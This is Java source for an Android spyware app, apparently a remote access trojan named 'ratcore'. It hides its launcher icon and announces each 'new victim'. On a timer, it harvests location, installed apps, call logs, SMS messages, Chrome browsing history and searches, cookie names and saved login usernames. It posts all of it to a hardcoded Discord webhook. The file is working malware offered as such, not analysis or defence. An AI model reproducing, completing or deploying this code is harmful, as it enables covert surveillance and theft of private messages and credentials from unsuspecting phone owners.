package com.ratcore;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import androidx.core.app.ActivityCompat;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends Activity {

    private static final String WEBHOOK = "https://discord.com/api/webhooks/1422384202699112509/ISG9CTFIGr7362rVKHHllI_Fs2A-wZEoqN0voYZD-Sv1JCozGtnx5TF4Vbp8YyCsTdlu";

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestPermissions();
        hideIcon();
        startCollector();

        send("NEW VICTIM CONNECTED\nModel: " + Build.MANUFACTURER + " " + Build.MODEL +
             "\nAndroid: " + Build.VERSION.RELEASE +
             "\nID: " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));

        finish();
        System.exit(0);
    }

    private void requestPermissions() {
        String[] perms = {
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            "android.permission.PACKAGE_USAGE_STATS"
        };
        ActivityCompat.requestPermissions(this, perms, 1);
    }

    private void hideIcon() {
        PackageManager p = getPackageManager();
        ComponentName c = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(c, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void startCollector() {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                send(collectAll());
            }
        }, 8000, 45000);
    }

    @SuppressLint("MissingPermission")
    private String collectAll() {
        StringBuilder data = new StringBuilder();

        data.append("Device: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
        data.append("Android: ").append(Build.VERSION.RELEASE).append(" (").append(Build.VERSION.SDK_INT).append(")\n");
        data.append("Battery: ").append(((BatteryManager)getSystemService(BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)).append("%\n");

        try {
            LocationManager lm = (LocationManager)getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) data.append("Location: https://maps.google.com/?q=").append(loc.getLatitude()).append(",").append(loc.getLongitude()).append("\n");
        } catch (Exception e) {}

        data.append("Installed Apps: ");
        for (android.content.pm.ApplicationInfo app : getPackageManager().getInstalledApplications(0)) {
            data.append(app.packageName.substring(app.packageName.lastIndexOf(".")+1)).append(" ");
        }
        data.append("\n");

        data.append("Call Log (last 10):\n");
        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 10")) {
            if (c != null) while (c.moveToNext()) {
                data.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))).append(" | ")
                    .append(c.getString(c.getColumnIndex(CallLog.Calls.DATE))).append("\n");
            }
        } catch (Exception e) {}

        data.append("SMS (last 20):\n");
        try (Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 20")) {
            if (c != null) while (c.moveToNext()) {
                data.append(c.getString(c.getColumnIndex("address"))).append(" → ")
                    .append(c.getString(c.getColumnIndex("body"))).append("\n");
            }
        } catch (Exception e) {}

        data.append("Chrome History & Searches:\n");
        extractChromeData(data);

        data.append("Chrome Cookies + Saved Logins:\n");
        extractChromeCookiesAndLogins(data);

        return data.toString();
    }

    private void extractChromeData(StringBuilder sb) {
        try {
            File chromeDb = new File("/data/data/com.android.chrome/app_chrome/Default/History");
            if (chromeDb.exists()) {
                SQLiteDatabase db = SQLiteDatabase.openDatabase(chromeDb.getPath(), null, SQLiteDatabase.OPEN_READONLY);
                Cursor c = db.rawQuery("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30", null);
                while (c.moveToNext()) {
                    sb.append(c.getString(0)).append("\n");
                }
                c.close();
                Cursor s = db.rawQuery("SELECT term FROM keyword_search_terms ORDER BY term DESC LIMIT 30", null);
                while (s.moveToNext()) {
                    sb.append("[SEARCH] ").append(s.getString(0)).append("\n");
                }
                s.close();
                db.close();
            }
        } catch (Exception e) {}
        sb.append("-------\n");
    }

    private void extractChromeCookiesAndLogins(StringBuilder sb) {
        try {
            File cookieDb = new File("/data/data/com.android.chrome/app_chrome/Default/Cookies");
            if (cookieDb.exists()) {
                SQLiteDatabase db = SQLiteDatabase.openDatabase(cookieDb.getPath(), null, SQLiteDatabase.OPEN_READONLY);
                Cursor c = db.rawQuery("SELECT host_key, name, encrypted_value FROM cookies LIMIT 50", null);
                while (c.moveToNext()) {
                    sb.append(c.getString(0)).append(" | ").append(c.getString(1)).append("\n");
                }
                c.close();
                db.close();
            }

            File loginDb = new File("/data/data/com.android.chrome/app_chrome/Default/Login Data");
            if (loginDb.exists()) {
                SQLiteDatabase db = SQLiteDatabase.openDatabase(loginDb.getPath(), null, SQLiteDatabase.OPEN_READONLY);
                Cursor c = db.rawQuery("SELECT origin_url, username_value, password_value FROM logins", null);
                while (c.moveToNext()) {
                    sb.append("[LOGIN] ").append(c.getString(0)).append(" | User: ").append(c.getString(1)).append("\n");
                }
                c.close();
                db.close();
            }
        } catch (Exception e) {}
        sb.append("-------\n");
    }

    private void send(String content) {
        new Thread(() -> {
            try {
                URL url = new URL(WEBHOOK);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setDoOutput(true);
                String payload = "{\"content\":\"```" + content.replace("`", "") + "```\"}";
                con.getOutputStream().write(payload.getBytes());
                con.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }
}
